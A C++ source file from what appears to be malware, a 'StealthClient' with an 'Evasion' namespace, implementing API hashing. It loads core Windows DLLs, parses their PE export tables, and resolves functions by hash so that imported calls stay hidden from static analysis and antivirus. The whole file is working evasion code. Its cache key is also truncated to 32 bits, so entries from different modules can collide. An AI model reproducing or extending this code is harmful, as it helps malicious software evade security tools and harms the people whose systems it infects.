#include "dynamic_api.h"
#include <iostream>
#include <algorithm>

namespace StealthClient {
namespace Evasion {

// Global instance
DynamicAPIResolver g_APIResolver;

DynamicAPIResolver::DynamicAPIResolver() {
    // Initialize with common modules
    LoadModuleByHash(APIHashes::KERNEL32);
    LoadModuleByHash(APIHashes::NTDLL);
    LoadModuleByHash(APIHashes::USER32);
    LoadModuleByHash(APIHashes::ADVAPI32);
}

DynamicAPIResolver::~DynamicAPIResolver() {
    ClearCache();
}

HMODULE DynamicAPIResolver::LoadModuleByHash(uint32_t moduleHash) {
    // Check cache first
    auto it = m_moduleCache.find(moduleHash);
    if (it != m_moduleCache.end()) {
        return it->second;
    }
    
    // Map hash to module name
    std::string moduleName;
    switch (moduleHash) {
        case APIHashes::KERNEL32:
            moduleName = "kernel32.dll";
            break;
        case APIHashes::NTDLL:
            moduleName = "ntdll.dll";
            break;
        case APIHashes::USER32:
            moduleName = "user32.dll";
            break;
        case APIHashes::ADVAPI32:
            moduleName = "advapi32.dll";
            break;
        default:
            return nullptr;
    }
    
    // Load module
    HMODULE module = LoadLibraryA(moduleName.c_str());
    if (module) {
        m_moduleCache[moduleHash] = module;
    }
    
    return module;
}

FARPROC DynamicAPIResolver::GetFunctionByHash(HMODULE module, uint32_t functionHash) {
    if (!module) return nullptr;
    
    // Create cache key
    uint64_t cacheKey = (reinterpret_cast<uint64_t>(module) << 32) | functionHash;
    
    // Check cache first
    auto it = m_functionCache.find(static_cast<uint32_t>(cacheKey));
    if (it != m_functionCache.end()) {
        return it->second;
    }
    
    // Get module info
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(module);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    
    IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
        reinterpret_cast<BYTE*>(module) + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return nullptr;
    }
    
    // Get export directory
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) {
        return nullptr;
    }
    
    IMAGE_EXPORT_DIRECTORY* exportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
        reinterpret_cast<BYTE*>(module) + exportDir.VirtualAddress);
    
    // Get function addresses
    DWORD* functionAddresses = reinterpret_cast<DWORD*>(
        reinterpret_cast<BYTE*>(module) + exportDirectory->AddressOfFunctions);
    DWORD* nameAddresses = reinterpret_cast<DWORD*>(
        reinterpret_cast<BYTE*>(module) + exportDirectory->AddressOfNames);
    WORD* nameOrdinals = reinterpret_cast<WORD*>(
        reinterpret_cast<BYTE*>(module) + exportDirectory->AddressOfNameOrdinals);
    
    // Search for function by hash
    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        const char* functionName = reinterpret_cast<const char*>(
            reinterpret_cast<BYTE*>(module) + nameAddresses[i]);
        
        if (HashString(functionName) == functionHash) {
            DWORD functionRVA = functionAddresses[nameOrdinals[i]];
            FARPROC function = reinterpret_cast<FARPROC>(
                reinterpret_cast<BYTE*>(module) + functionRVA);
            
            // Cache the result
            m_functionCache[static_cast<uint32_t>(cacheKey)] = function;
            return function;
        }
    }
    
    return nullptr;
}

FARPROC DynamicAPIResolver::GetKernel32Function(uint32_t functionHash) {
    HMODULE kernel32 = LoadModuleByHash(APIHashes::KERNEL32);
    return GetFunctionByHash(kernel32, functionHash);
}

FARPROC DynamicAPIResolver::GetNtdllFunction(uint32_t functionHash) {
    HMODULE ntdll = LoadModuleByHash(APIHashes::NTDLL);
    return GetFunctionByHash(ntdll, functionHash);
}

FARPROC DynamicAPIResolver::GetUser32Function(uint32_t functionHash) {
    HMODULE user32 = LoadModuleByHash(APIHashes::USER32);
    return GetFunctionByHash(user32, functionHash);
}

FARPROC DynamicAPIResolver::GetAdvapi32Function(uint32_t functionHash) {
    HMODULE advapi32 = LoadModuleByHash(APIHashes::ADVAPI32);
    return GetFunctionByHash(advapi32, functionHash);
}

void DynamicAPIResolver::ClearCache() {
    m_functionCache.clear();
    // Don't free modules as they're system modules
    m_moduleCache.clear();
}

} // namespace Evasion
} // namespace StealthClient
